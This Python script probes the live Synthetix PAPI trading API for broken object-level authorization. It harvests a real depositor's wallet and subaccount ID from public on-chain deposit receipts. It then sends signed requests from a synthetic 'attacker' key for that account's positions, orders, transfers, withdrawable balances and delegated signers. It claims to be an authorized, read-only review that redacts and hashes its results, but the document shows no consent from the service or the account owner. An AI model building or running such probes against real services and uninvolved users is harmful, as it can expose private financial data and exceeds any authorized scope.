#!/usr/bin/env python3
"""Exhaustive read-action authorization matrix for Synthetix PAPI.

Safety constraints:
- derives one candidate target only from public Deposit receipts and unsigned account discovery;
- deterministic synthetic attacker EOA confirmed to own/manage/delegate zero accounts;
- sends only documented or production-advertised read actions;
- never sends orders, transfers, withdrawals, delegation changes, or any state-changing action;
- raw target wallet/account IDs and response bodies are never persisted;
- retains only hashes, status/error metadata, counts and response schemas.

Goal: detect action-specific BOLA/IDOR where one account query omits the recovered-signer
ownership/manager/delegate check applied by the rest of the trade API.
"""
from __future__ import annotations

import hashlib
import json
import pathlib
import re
import time
import urllib.error
import urllib.request
from typing import Any

from eth_account import Account
from eth_account.messages import encode_typed_data
from eth_utils import to_checksum_address

OUT = pathlib.Path("read_auth_matrix")
OUT.mkdir(parents=True, exist_ok=True)

RPC_URLS = (
    "https://ethereum-rpc.publicnode.com",
    "https://eth.llamarpc.com",
    "https://rpc.mevblocker.io",
    "https://eth.drpc.org",
)
PAPI_INFO = "https://papi.synthetix.io/v1/info"
PAPI_TRADE = "https://papi.synthetix.io/v1/trade"
DEPOSIT_PROXY = "0xD62595c3c23B690BAEE0935e107A209Cb1Dbd37B"
ASSET_DEPOSITED_TOPIC = "0x8d9f8eed9603fe0e069574aaf008e644885b52d54ba86f026277ac9db1c2d08a"
DEPOSIT_TX_HASHES = (
    "0xb8099b559a99ef2e5122c7b37e2288cd21c90ab4a9cd282ebd556fac21c8618c",
    "0xff4a76000616a7bd6e7eec8dc8dd5ddc3aad54d61ae14e096b22721d1d4993fa",
    "0xff49e1668459cf9d6740fa406bb6e1714495451614bf7a0cbba287fd012d0406",
    "0x2bcf6ce3cd19759da83c531db0c37756af79371e4acd0c5e94e870c0485cd0dc",
    "0x37e4ed3427007aa6c4f2d3297fd12b42b854ae55fae5b1203fac5406d9b170ec",
    "0x3768526db1bd1a128785882ad010ba415508d51ff11b603872fc7d45789ccfc8",
    "0x0c9bf25d6b94eec665034bccfe2e72132084f6e540eae6bdfd3f6f4db25d3f30",
)
ATTACKER = Account.from_key("0x" + "a1" * 32)
UA = "Mozilla/5.0 (compatible; authorized-read-only-security-review/1.0)"
MAX_BODY = 3 * 1024 * 1024
ADDRESS_RE = re.compile(r"0x[a-fA-F0-9]{40}")

DOMAIN_FIELDS = [
    {"name": "name", "type": "string"},
    {"name": "version", "type": "string"},
    {"name": "chainId", "type": "uint256"},
    {"name": "verifyingContract", "type": "address"},
]
DOMAIN = {
    "name": "Synthetix",
    "version": "1",
    "chainId": 1,
    "verifyingContract": "0x0000000000000000000000000000000000000000",
}
TYPES = {
    "EIP712Domain": DOMAIN_FIELDS,
    "SubAccountAction": [
        {"name": "subAccountId", "type": "uint256"},
        {"name": "action", "type": "string"},
        {"name": "nonce", "type": "uint256"},
        {"name": "expiresAfter", "type": "uint256"},
    ],
}

CASES: list[tuple[str, dict[str, Any]]] = [
    ("getSubAccount", {}),
    ("getSubAccounts", {}),
    ("getPositions", {}),
    ("getOpenOrders", {}),
    ("getOrderHistory", {"limit": 1}),
    ("getOrdersHistory", {"limit": 1}),
    ("getPerformanceHistory", {"period": "1d"}),
    ("getPositionHistory", {"limit": 1}),
    ("getTrades", {"limit": 1}),
    ("getTradesForPosition", {"positionId": "1", "limit": 1}),
    ("getBalanceUpdates", {"limit": 1}),
    ("getFundingPayments", {"limit": 1}),
    ("getTransfers", {"limit": 1}),
    ("getWithdrawableAmounts", {"symbols": ["USDT"]}),
    ("getDelegatedSigners", {}),
    ("getFeeRate", {}),
    ("getRateLimits", {}),
    ("getReferral", {"limit": 1}),
    ("getPortfolio", {}),
    ("getSnaxpotEpochTickets", {"startEpoch": 1, "endEpoch": 1}),
    ("getSnaxpotMyWinningTickets", {"epochId": 1}),
    ("getSnaxpotTickets", {"epochId": 1}),
    ("getSnaxpotPreferences", {}),
]


def digest(value: str | bytes) -> str:
    if isinstance(value, str):
        value = value.encode()
    return hashlib.sha256(value).hexdigest()


def redact(value: Any) -> str | None:
    if value is None:
        return None
    text = ADDRESS_RE.sub("<address>", str(value))
    text = re.sub(r"0x[a-fA-F0-9]{64,}", "<hex>", text)
    text = re.sub(r"\b\d{8,}\b", "<number>", text)
    return text[:1000]


def post_json(url: str, payload: dict[str, Any], timeout: int = 45) -> tuple[int, bytes, dict[str, str], float]:
    body = json.dumps(payload, separators=(",", ":")).encode()
    request = urllib.request.Request(
        url,
        data=body,
        headers={"User-Agent": UA, "Content-Type": "application/json", "Accept": "application/json"},
        method="POST",
    )
    started = time.monotonic()
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            response_body = response.read(MAX_BODY + 1)
            if len(response_body) > MAX_BODY:
                raise ValueError("response too large")
            return response.status, response_body, dict(response.headers.items()), time.monotonic() - started
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read(MAX_BODY + 1), dict(exc.headers.items()) if exc.headers else {}, time.monotonic() - started


def parse_json(body: bytes) -> Any:
    try:
        return json.loads(body)
    except Exception:
        return None


def schema(value: Any, depth: int = 0) -> Any:
    if depth >= 5:
        return type(value).__name__
    if isinstance(value, dict):
        return {str(k): schema(v, depth + 1) for k, v in sorted(value.items())}
    if isinstance(value, list):
        return {"type": "list", "count": len(value), "sample": schema(value[0], depth + 1) if value else None}
    return type(value).__name__


def rpc(method: str, params: list[Any]) -> Any:
    errors: list[str] = []
    payload = {"jsonrpc": "2.0", "id": 1, "method": method, "params": params}
    for url in RPC_URLS:
        try:
            status, body, _, _ = post_json(url, payload)
            parsed = json.loads(body)
            if status >= 400 or "error" in parsed:
                errors.append(str(parsed.get("error")))
                continue
            return parsed["result"]
        except Exception as exc:  # noqa: BLE001
            errors.append(type(exc).__name__)
    raise RuntimeError("RPC failed: " + " | ".join(errors))


def topic_address(topic: str) -> str:
    return to_checksum_address("0x" + topic[-40:])


def discover_target() -> tuple[str, str, str]:
    for tx_hash in DEPOSIT_TX_HASHES:
        receipt = rpc("eth_getTransactionReceipt", [tx_hash])
        if not isinstance(receipt, dict):
            continue
        for log in receipt.get("logs", []):
            topics = log.get("topics", [])
            if (
                str(log.get("address", "")).lower() == DEPOSIT_PROXY.lower()
                and len(topics) >= 3
                and str(topics[0]).lower() == ASSET_DEPOSITED_TOPIC.lower()
            ):
                beneficiary = topic_address(topics[2])
                status, body, _, _ = post_json(
                    PAPI_INFO,
                    {"params": {"action": "getSubAccountIds", "walletAddress": beneficiary, "includeDelegations": True}},
                )
                parsed = parse_json(body)
                response = parsed.get("response") if isinstance(parsed, dict) else None
                ids: list[str] = []
                if status == 200 and isinstance(parsed, dict) and parsed.get("status") == "ok":
                    if isinstance(response, list):
                        ids = [str(v) for v in response]
                    elif isinstance(response, dict):
                        ids = [str(v) for v in response.get("subAccountIds", []) or []]
                if ids:
                    return beneficiary, ids[0], tx_hash
        time.sleep(0.15)
    raise RuntimeError("No public deposit beneficiary with an owned account was found")


def account_count(response: Any) -> int | None:
    if isinstance(response, list):
        return len(response)
    if isinstance(response, dict):
        total = 0
        recognized = False
        for key in ("subAccountIds", "delegatedSubAccountIds", "managedSubAccountIds"):
            value = response.get(key)
            if isinstance(value, list):
                recognized = True
                total += len(value)
        return total if recognized else None
    return None


def format_signature(signed: Any) -> dict[str, Any]:
    return {"v": signed.v, "r": "0x" + format(signed.r, "064x"), "s": "0x" + format(signed.s, "064x")}


def envelope(action: str, target_id: str, extra: dict[str, Any], nonce: int) -> dict[str, Any]:
    expires_after = nonce + 300_000
    encoded = encode_typed_data(
        full_message={
            "types": TYPES,
            "primaryType": "SubAccountAction",
            "domain": DOMAIN,
            "message": {"subAccountId": int(target_id), "action": action, "nonce": nonce, "expiresAfter": expires_after},
        }
    )
    params = {"action": action, "subaccountId": target_id, "walletAddress": ATTACKER.address, **extra}
    return {"signature": format_signature(ATTACKER.sign_message(encoded)), "nonce": nonce, "expiresAfter": expires_after, "params": params}


def summarize(name: str, status: int, body: bytes, headers: dict[str, str], elapsed: float) -> dict[str, Any]:
    parsed = parse_json(body)
    error = parsed.get("error") if isinstance(parsed, dict) else None
    error_code = error.get("code") if isinstance(error, dict) else None
    error_message = error.get("message") if isinstance(error, dict) else error
    response = parsed.get("response") if isinstance(parsed, dict) else None
    success = status == 200 and isinstance(parsed, dict) and parsed.get("status") == "ok"
    raw = str(error_message) if error_message is not None else ""
    return {
        "name": name,
        "httpStatus": status,
        "elapsedMs": round(elapsed * 1000, 2),
        "apiStatus": parsed.get("status") if isinstance(parsed, dict) else None,
        "success": success,
        "errorCode": error_code,
        "errorCategory": error.get("category") if isinstance(error, dict) else None,
        "errorMessageRedacted": redact(error_message),
        "errorMessageSha256": digest(raw) if raw else None,
        "responseSchema": schema(response),
        "responseTopLevelCount": len(response) if isinstance(response, (dict, list)) else None,
        "bodySha256": digest(body),
        "bodyBytes": len(body),
        "rateLimit": parsed.get("rateLimit") if isinstance(parsed, dict) and isinstance(parsed.get("rateLimit"), dict) else None,
        "requestId": (parsed.get("request_id") if isinstance(parsed, dict) else None) or headers.get("X-Request-Id") or headers.get("x-request-id"),
    }


def main() -> None:
    target_wallet, target_id, source_tx = discover_target()
    evidence: dict[str, Any] = {
        "safety": "Read-only actions only; public target discovery; no raw target identity, ID, or response body retained.",
        "attackerAddress": ATTACKER.address,
        "targetWalletSha256": digest(target_wallet.lower()),
        "targetSubaccountIdSha256": digest(target_id),
        "sourceTransactionSha256": digest(source_tx),
        "tests": [],
    }
    status, body, headers, elapsed = post_json(
        PAPI_INFO,
        {"params": {"action": "getSubAccountIds", "walletAddress": ATTACKER.address, "includeDelegations": True}},
    )
    preflight = summarize("attacker_preflight", status, body, headers, elapsed)
    parsed = parse_json(body)
    response = parsed.get("response") if isinstance(parsed, dict) else None
    preflight["attackerAccountCount"] = account_count(response)
    evidence["tests"].append(preflight)
    if preflight.get("attackerAccountCount") != 0:
        evidence["probeAborted"] = True
        evidence["abortReason"] = "Synthetic attacker was not confirmed to have zero accounts."
    else:
        base_nonce = int(time.time() * 1000) + 30_000
        for index, (action, extra) in enumerate(CASES):
            status, body, headers, elapsed = post_json(PAPI_TRADE, envelope(action, target_id, extra, base_nonce + index))
            evidence["tests"].append(summarize(action, status, body, headers, elapsed))
            if index + 1 < len(CASES):
                time.sleep(0.55)
    unexpected = [item for item in evidence["tests"] if item.get("success") and item.get("name") != "attacker_preflight"]
    ownership_failures = [item["name"] for item in evidence["tests"] if re.search(r"ownership|not authorized|permission", str(item.get("errorMessageRedacted") or ""), re.I)]
    unsupported = [item["name"] for item in evidence["tests"] if re.search(r"unknown action|unsupported type|invalid request type", str(item.get("errorMessageRedacted") or ""), re.I)]
    validation_failures = [item["name"] for item in evidence["tests"] if item.get("httpStatus") == 400 or item.get("errorCode") in ("VALIDATION_ERROR", "INVALID_FORMAT")]
    evidence["summary"] = {
        "testCount": len(evidence["tests"]),
        "probeAborted": bool(evidence.get("probeAborted")),
        "unexpectedSuccessCount": len(unexpected),
        "unexpectedSuccessActions": [item["name"] for item in unexpected],
        "ownershipFailureActions": ownership_failures,
        "unsupportedActions": unsupported,
        "validationFailureActions": validation_failures,
        "caseMatrix": [{key: item.get(key) for key in ("name", "httpStatus", "apiStatus", "success", "errorCode", "errorMessageRedacted", "responseSchema", "rateLimit", "bodySha256")} for item in evidence["tests"]],
    }
    (OUT / "evidence.json").write_text(json.dumps(evidence, indent=2), encoding="utf-8")
    (OUT / "summary.json").write_text(json.dumps(evidence["summary"], indent=2), encoding="utf-8")
    print(json.dumps(evidence["summary"], indent=2))


if __name__ == "__main__":
    main()
